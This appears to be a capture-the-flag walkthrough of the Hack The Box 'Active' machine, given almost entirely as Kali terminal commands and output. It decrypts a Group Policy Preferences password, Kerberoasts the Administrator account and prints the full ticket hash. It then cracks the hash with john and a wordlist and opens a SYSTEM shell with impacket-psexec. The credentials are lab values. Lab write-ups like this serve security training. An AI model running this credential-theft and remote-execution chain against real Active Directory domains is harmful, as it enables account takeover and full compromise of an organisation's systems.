
```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ cat smb/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
                                                                                                                                                                                                                                                                                                               
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

SVC_TGS:GPPstillStandingStrong2k18

```bash
                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ impacket-GetUserSPNs  -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2023-02-09 14:09:14.413763             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$387349a649f1c3dbf70e6870583cff45$04e4cffa1a112eb2d1cccffdacec056a5a23fdd2b729ee07f48a59a07a313a26de60f3b3a293a260087594035fa3dbea29d9d1c88f87c027572ec9d45a9a89559be04f7d3b43ebcd957b9dddd01e2351eef732a3f61ccf8d07a8cf3ee226cb8f572f728493d24ef0c42d75976e04a17b3d08bc2363289a80e4bf250ea655879630d5c81295ff642aa9517cc3fbba8d2950407cc74b7553e18fa305a5b2064b73cb9424722593dc47d1c44d4e7a455688a00e69411b2d0b35a1a733807b71f80e67e36fce8b316a325eaa92c73da16c3ff58e0b1a968eeffdbf6a6e3d4548df3cd417a842344b455f90298a406cbba010d9633e0c239cd98ce03344ce5a48952cf089d804dd293ffc1933d1e89ce3b8cd84788fd6541819b5599ec2ba5125774cb19e662d64b9f29db68c87b8a58b3963f1767ba87ee46cee5e3fffce14815eb6bb79d529cf866d5909e9cd514bacf035f9a8eaf9b245cd32559a7962fc87f1f1a097660c6d9dc813a09b79bc81289cfc1f61ea4e321d8b0cd771cb65be5504a38ef6681a18fde572f9a680375a19eaec2f318f2766828c3241a2b1a5d8bdf406765d2f048a42841b42146aa13b08fd121a232dd94fa53de3e5edb837537045074d11dc9b549afba48ec97cc95fb37c99dc4f5337bdb5e935e8ff277d4b883d28efd3fd1fe994376a3db6a42382270f7110c79e3729eb9152e1e83845d27a21ae47dd51b56badc5cf0a80c27b6aaf28d4612757d5523919a18152e5eecc4d1e197eb039c9d8f4607a75df2ca2c13fc13232afcc9c4d2b332aed1325da9f28a1c6b0c1ef58a576ecd24d21afd6b3cd3fc08f03e88b94d91bcf7e21539883e17120e75ac2b0fdd742612679dd9ced2eda74d361668835898de54966bf93454d74edd5f674fe4dc03fe37ffdbd577a800cec7c00a191f439be1f347174357d6a028965502e69d9d1462fa81eae541b7632fdbc421dafb64bf591ffc4665ff5c19986805298092ca5a69554cecee75d0f44be4022a73a13d4271196934ba4cc808bdfb374cc5fec760ad460cc91682e7e3582289d0a8c272eb52dc318475de0e403ca63ccb63c32f365f6b1a51896a031cdb089d5faec13ef04d154b52a6b641167ccadb37628a90aa07347ea4f80b3e63c70e649659a40246a56ebc7da6fa01c9462e6b7c797363101a938d7d289b3946d3553c01d75c29aba191d53cb8ed43658f5427bd636345aa87a01f4eac3166f63aa10a70da7d8a445b587f7

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ john kerbo_hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:13 DONE (2023-02-09 20:20) 0.07680g/s 809329p/s 809329c/s 809329C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Hash cracked : Administrator:Ticketmaster1968

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ impacket-psexec active.htb/Administrator@10.10.10.100
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file vOdCwGlh.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service kSua on 10.10.10.100.....
[*] Starting service kSua.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system


```